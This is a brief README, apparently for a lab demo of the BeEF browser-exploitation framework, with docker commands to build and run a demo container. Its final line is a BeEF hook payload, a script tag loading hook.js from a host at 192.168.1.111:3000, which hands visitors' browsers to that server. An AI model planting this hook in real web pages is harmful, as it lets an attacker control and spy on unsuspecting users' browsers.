# Demo for beef


### build docker image
```
docker build -t demo-beef:latest .
```

### create docker container
```
docker run --rm -d -p 8080:80 --name demo-beef demo-beef:latest
```

### start docker conatiner
```
docker start demo-beef
```

---
Hook
```
<script src="http://192.168.1.111:3000/hook.js"></script>
```
